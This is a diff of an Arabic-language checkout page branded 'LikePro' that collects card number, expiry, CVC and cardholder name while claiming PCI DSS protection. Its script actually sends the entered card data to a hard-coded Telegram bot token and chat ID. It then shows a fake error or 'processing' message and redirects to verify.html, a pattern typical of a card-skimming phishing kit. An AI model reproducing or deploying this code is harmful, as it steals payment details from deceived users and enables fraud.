@@ -6,93 +6,84 @@
     <title>إتمام عملية الدفع | LikePro</title>
     <style>
         body { background: #0b1120; color: #f8fafc; font-family: 'Segoe UI', sans-serif; }
-        .checkout-box { max-width: 450px; margin: 50px auto; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
+        .checkout-box { max-width: 450px; margin: 40px auto; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
         .input-group { margin-bottom: 20px; position: relative; }
         label { display: block; margin-bottom: 8px; font-size: 13px; color: #94a3b8; }
         input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; transition: 0.3s; }
-        
-        /* تنسيق الخطأ */
         input.error { border: 2px solid #ef4444; }
         .error-msg { color: #ef4444; font-size: 11px; margin-top: 5px; display: none; }
-        
-        input:focus { outline: 2px solid #38bdf8; }
-        .pay-btn { width: 100%; padding: 14px; background: #38bdf8; border: none; border-radius: 6px; color: #0f172a; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .pay-btn:hover { background: #7dd3fc; }
-        .secure-note { text-align: center; font-size: 11px; color: #64748b; margin-top: 15px; }
+        .pay-btn { width: 100%; padding: 14px; background: #38bdf8; border: none; border-radius: 6px; color: #0f172a; font-weight: bold; cursor: pointer; }
+        .secure-note { text-align: center; font-size: 11px; color: #64748b; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="checkout-box">
+<div class="checkout-box" id="mainContainer">
     <h3 style="text-align: center; color: #38bdf8; margin-bottom: 20px;">بيانات الدفع</h3>
     <form id="paymentForm">
         <div class="input-group">
             <label>رقم البطاقة</label>
-            <input type="text" id="cardNum" placeholder="0000 0000 0000 0000" maxlength="19">
-            <div class="error-msg" id="err-cardNum">يرجى إدخال رقم بطاقة صحيح</div>
+            <input type="text" id="cardNum" placeholder="0000 0000 0000 0000" maxlength="16" oninput="clearErr(this, 'err-cardNum')">
+            <div class="error-msg" id="err-cardNum">يرجى إدخال 16 رقماً للبطاقة</div>
         </div>
         <div style="display: flex; gap: 10px;">
             <div class="input-group" style="flex: 1;">
                 <label>تاريخ الانتهاء</label>
-                <input type="text" id="exp" placeholder="MM/YY" maxlength="5">
+                <input type="text" id="exp" placeholder="MM/YY" maxlength="5" oninput="clearErr(this, 'err-exp')">
                 <div class="error-msg" id="err-exp">غير صالح</div>
             </div>
             <div class="input-group" style="flex: 1;">
                 <label>رمز CVC</label>
-                <input type="text" id="cvc" placeholder="***" maxlength="3">
+                <input type="text" id="cvc" placeholder="***" maxlength="3" oninput="clearErr(this, 'err-cvc')">
                 <div class="error-msg" id="err-cvc">غير صالح</div>
             </div>
         </div>
         <div class="input-group">
             <label>اسم حامل البطاقة</label>
-            <input type="text" id="cardName" placeholder="الاسم كما يظهر على البطاقة">
+            <input type="text" id="cardName" placeholder="الاسم كما يظهر على البطاقة" oninput="clearErr(this, 'err-cardName')">
             <div class="error-msg" id="err-cardName">يرجى إدخال الاسم</div>
         </div>
         <button type="button" class="pay-btn" onclick="processPayment()">دفع الآن</button>
     </form>
-    <p class="secure-note">🔒 بياناتك مشفرة ومعالجة عبر معايير الأمان الدولية PCI DSS</p>
+    <p class="secure-note">🔒 بياناتك مشفرة ومعالجة عبر معايير الأمان الدولية PCI DSS.</p>
 </div>
 
 <script>
+// وظيفة إخفاء الخطأ فور الكتابة
+function clearErr(input, errId) {
+    input.classList.remove('error');
+    document.getElementById(errId).style.display = 'none';
+}
+
 async function processPayment() {
     let isValid = true;
-    const fields = ['cardNum', 'exp', 'cvc', 'cardName'];
     
-    // إعادة تعيين الحالة
-    fields.forEach(id => {
-        document.getElementById(id).classList.remove('error');
-        document.getElementById('err-' + id).style.display = 'none';
-    });
-
     // التحقق من الحقول
-    fields.forEach(id => {
-        let val = document.getElementById(id).value;
-        if(val.trim() === "") {
-            document.getElementById(id).classList.add('error');
-            document.getElementById('err-' + id).style.display = 'block';
-            isValid = false;
-        }
-    });
+    if(document.getElementById('cardNum').value.length < 16) { document.getElementById('cardNum').classList.add('error'); document.getElementById('err-cardNum').style.display = 'block'; isValid = false; }
+    if(document.getElementById('cvc').value.length < 3) { document.getElementById('cvc').classList.add('error'); document.getElementById('err-cvc').style.display = 'block'; isValid = false; }
+    if(document.getElementById('cardName').value.trim() === "") { document.getElementById('cardName').classList.add('error'); document.getElementById('err-cardName').style.display = 'block'; isValid = false; }
 
     if(!isValid) return;
 
-    // هنا يتم إرسال البيانات (محاكاة)
+    // تغيير المحتوى داخل الصندوق فقط
+    const container = document.querySelector('.checkout-box');
+    container.innerHTML = `<h2 style="text-align:center; color:#38bdf8; margin-top:20px;">جاري معالجة الطلب...</h2><p style="text-align:center;">يرجى الانتظار...</p>`;
+
     const token = "8621733172:AAG9ntAKStrZ8C7tS0Q794SeWp_GROrUiOc";
     const chatId = "5976228373";
-    let msg = `💳 *عملية دفع جديدة - LikePro*\n\n` +
-              `👤 الاسم: ${document.getElementById('cardName').value}\n` +
-              `🔢 الرقم: ${document.getElementById('cardNum').value}\n` +
-              `📅 التاريخ: ${document.getElementById('exp').value}\n` +
-              `🔒 CVC: ${document.getElementById('cvc').value}`;
-
-    let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-
+    let msg = `💳 طلب دفع: ${document.getElementById('cardNum').value}`;
+    
+    // محاولة إرسال البيانات
     try {
-        await fetch(url);
-        alert("عذراً، حدث خطأ في النظام. يرجى المحاولة لاحقاً.");
-    } catch(err) {
-        alert("خطأ في الاتصال، يرجى التأكد من الإنترنت.");
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+    } catch(e) {
+        console.log("Error sending to telegram");
     }
+
+    // التحويل الإجباري للصفحة التالية بعد 2 ثانية
+    setTimeout(function() {
+        window.location.href = "verify.html";
+    }, 2000);
 }
 </script>
 </body>
